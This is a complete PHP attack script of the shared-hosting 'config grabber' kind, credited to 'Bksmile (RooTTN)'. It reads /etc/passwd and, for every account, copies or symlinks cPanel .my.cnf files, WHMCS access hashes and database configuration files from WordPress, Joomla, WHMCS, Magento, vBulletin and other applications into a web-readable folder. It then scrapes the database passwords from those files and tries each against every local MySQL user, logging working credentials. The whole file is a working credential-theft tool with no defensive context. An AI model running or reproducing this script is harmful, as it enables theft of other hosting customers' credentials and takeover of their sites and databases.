<?php
@error_reporting(0);
@ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('file_uploads',1);
$c = file_get_contents('/etc/passwd');
$get = explode("\n",$c);
$folfig = 'home';
$home = 'home';
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess = "Options Indexes FollowSymLinks
DirectoryIndex achon666ju5t.extremecrew
AddType txt .php
AddHandler txt .php";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
foreach($get as $pwd){
$userx = explode(':',$pwd);
$users = $userx[0];
$user=trim($users);
copy('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connect.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connect.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connect.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connect.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
}
echo "[+] Config........ done !<br>". PHP_EOL;
$dir='http://'.$_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']).'/home/';
echo$dir.'<br>'. PHP_EOL;
$cn = Get_Source($dir);
preg_match_all('#href="(.*?)"#',$cn,$m); 
    foreach($m[1] as $txt){	
	$url = $dir.$txt;
    $cnurl = Get_Source($url); 
    preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$cnurl,$m1);               // wordpress 
    preg_match('#password = \'(.*)\'#',$cnurl,$m2);                    // joomla 
    preg_match('#password\'] = \'(.*)\'#',$cnurl,$m3);                   // vb 
    preg_match('#db_password = "(.*)"#',$cnurl,$m4);                    // whmcs 
    preg_match('#db_password = \'(.*)\'#',$cnurl,$m4);                  // whmcs 
    preg_match('#dbpass = "(.*)"#',$cnurl,$m5);                        // 
    preg_match('#password    = \'(.*)\'#',$cnurl,$m6);                  // connnect.php 
    preg_match('#dbpasswd = \'(.*)\'#',$cnurl,$m8);                   // phpBB 3.0.x 
    preg_match('#password_localhost = "(.*)"#',$cnurl,$m9);           // conexao.php 
    preg_match('#senha = "(.*)"#',$cnurl,$m10); 
	
	if(!empty($m1[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m1[1]."\r\n");fclose($f); } 
    elseif(!empty($m2[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m2[1]."\r\n");fclose($f); } 
    elseif(!empty($m3[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m3[1]."\r\n");fclose($f); } 
    elseif(!empty($m4[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m4[1]."\r\n");fclose($f); } 
    elseif(!empty($m5[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m5[1]."\r\n");fclose($f); } 
    elseif(!empty($m6[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m6[1]."\r\n");fclose($f); } 
    elseif(!empty($m7[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m7[1]."\r\n");fclose($f); } 
    elseif(!empty($m8[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m8[1]."\r\n");fclose($f); } 
    elseif(!empty($m9[1])){ $f=fopen("../pwd.tmp","ab");fwrite($f,$m9[1]."\r\n");fclose($f); } 
    elseif(!empty($m10[1])){$f=fopen("../pwd.tmp","ab");fwrite($f,$m10[1]."\r\n");fclose($f); } 
	
	}
echo "[+] Password ........ done !<br>". PHP_EOL;;
$c = file_get_contents('/etc/passwd');
$get = explode("\n",$c);
$m = @file_get_contents('../pwd.tmp');
$get1 = explode("\r\n",$m);
foreach($get as $gets){
$user = explode(':',$gets);
$users = $user[0];
foreach($get1 as $gets1){
            if(@mysql_connect('localhost',$users,$gets1))
            {
                echo '<span style=\'color:#5F08AB;\'>'.gethostname().'|'.$users.'|'.$gets1.'</span><br>'. PHP_EOL;
				$f=fopen("../cpanels.tmp","ab");fwrite($f,gethostname().'|'.$users.'|'.$gets1."\r\n");fclose($f);
			}
			}
}
echo "[+] Cpanel ........ done !<br>". PHP_EOL;
echo "Coded by Bksmile (RooTTN)<br>". PHP_EOL;
function Get_Source($url){$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_USERAGENT,"SamsungI8910/SymbianOS/9.1 Series60/3.0");
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch,CURLOPT_ENCODING,"gzip, deflate, compress");
curl_setopt($ch,CURLOPT_FRESH_CONNECT,1);
curl_setopt($ch,CURLOPT_TIMEOUT,10);
$source=curl_exec($ch);
curl_close($ch);
return$source;
}
?>
